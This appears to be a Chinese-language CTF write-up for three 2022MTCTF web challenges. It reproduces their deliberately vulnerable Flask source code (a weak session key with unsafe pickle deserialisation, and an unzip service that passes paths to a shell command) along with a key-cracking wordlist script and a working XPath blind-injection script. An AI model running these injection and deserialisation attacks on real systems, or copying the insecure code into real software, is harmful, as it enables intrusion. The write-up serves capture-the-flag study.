# 2022MTCTF

# web

## pickle

**源码**

```python
import base64
import pickle
from flask import Flask, session
import os
import random

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(2).hex()
@app.route('/')
def hello_world():
    if not session.get('user'):
        session['user'] = ''.join(random.choices("admin", k=5))
    return 'Hello {}!'.format(session['user'])

@app.route('/admin')
def admin():
    if session.get('user') != "admin":
        return f"<script>alert('Access Denied');window.location.href='/'</script>"
    else:
        try:
            a = base64.b64decode(session.get('ser_data')).replace(b"builtin", b"BuIltIn").replace(b"os", b"Os").replace(b"bytes", b"Bytes")
            if b'R' in a or b'i' in a or b'o' in a or b'b' in a:
                raise pickle.UnpicklingError("R i o b is forbidden")
            pickle.loads(base64.b64decode(session.get('ser_data')))
            return "ok"
        except:
            return "error!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

阅读源码发现是随机产生一个SECRET_KEY,用来产生session

![Untitled](2022MTCTF%20attachments/Untitled.png)

产生字典

```python

list = "1234567890abxdef"
f = open("MT.txt", 'a')
for l1 in list:
		for l2 in list:
			for l3 in list: 
				for l4 in list:
					text = "\"{}{}{}{}\"\n".format(l1,l2,l3,l4)
					f.write(text)
f.close()
```

waf

![Untitled](2022MTCTF%20attachments/Untitled%201.png)

总体步骤

- 绕过admin的session限制
- 绕过对字节码的限制

session限制之前已经绕过，为什么没有提代码中对函数名的替换呢，在阅读代码逻辑后发现这些对函数名的替换是赋值给a的最后执行了pickle.loads()还是session中的数据，而对字节码的校验也是对替换后的a来进行检测得，因此对函数名的替换反而成为了绕过对字节码的帮助

![Untitled](2022MTCTF%20attachments/Untitled%202.png)

![Untitled](2022MTCTF%20attachments/Untitled%203.png)

## baby_java

**盲注**

做的时候很奇怪跑不通可能是1’ or的锅

```python
import requests

url = "http://eci-2zeck6h5lu4htf36m573.cloudeci1.ichunqiu.com:8888/hello"
string="abcdefghjklmnopqrstuvwxyz1234567890{}-_"
def getstr():
    result=""
    for j in range(1,50):
        for i in string:
            #payload=f"-1'or substring(name(/*[1]), {j}, 1)='{i}' or '0'='"       #root
            #payload = f"-1'or substring(name(/root/*[1]), {j}, 1)='{i}' or '0'='" #user
            #payload = f"-1'or substring(name(/root/user/*[1]), {j}, 1)='{i}' or '0'='" #username
            payload = f"-1'or substring((//root[position()=1]/user[position()=1]/username[position()=2]),{j},1)='{i}' or '0'='"
            data = {"xpath":payload }
            r=requests.post(url,data=data)
            if "<p>user1</p>" in r.text:
                result+=i
                print(result)
        print("++++++++++++++++++++++++++++")

getstr()
```

## OnineUnzip

**源码**

```python
import os
import re
from hashlib import md5
from flask import Flask, redirect, request, render_template, url_for, make_response

app=Flask(__name__)

def extractFile(filepath):
    extractdir=filepath.split('.')[0]
    if not os.path.exists(extractdir):
        os.makedirs(extractdir)
    os.system(f'unzip -o {filepath} -d {extractdir}')
    return redirect(url_for('display',extractdir=extractdir))

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/display', methods=['GET'])
@app.route('/display/', methods=['GET'])
@app.route('/display/<path:extractdir>', methods=['GET'])
def display(extractdir=''):
    if re.search(r"\.\.", extractdir, re.M | re.I) != None:
        return "Hacker?"
    else:
        if not os.path.exists(extractdir):
            return make_response("error", 404)
        else:
            if not os.path.isdir(extractdir):
                f = open(extractdir, 'rb')
                response = make_response(f.read())
                response.headers['Content-Type'] = 'application/octet-stream'
                return response
            else:
                fn = os.listdir(extractdir)
                fn = [".."] + fn
                f = open("templates/template.html")
                x = f.read()
                f.close()
                ret = "<h1>文件列表:</h1><br><hr>"
                for i in fn:
                    tpath = os.path.join('/display', extractdir, i)
                    ret += "<a href='" + tpath + "'>" + i + "</a><br>"
                x = x.replace("HTMLTEXT", ret)
                return x

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    ip = request.remote_addr
    uploadpath = 'uploads/' + md5(ip.encode()).hexdigest()[0:4]

    if not os.path.exists(uploadpath):
        os.makedirs(uploadpath)

    if request.method == 'GET':
        return redirect('/')

    if request.method == 'POST':
        try:
            upFile = request.files['file']
            print(upFile.filename)
            if os.path.splitext(upFile.filename)[-1]=='.zip':
                filepath=f"{uploadpath}/{md5(upFile.filename.encode()).hexdigest()[0:4]}.zip"
                upFile.save(filepath)
                zipDatas = extractFile(filepath)
                return zipDatas
            else:
                return f"{upFile.filename} is not a zip file !"
        except:
            return make_response("error", 404)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
```

**软链接**

**pin码**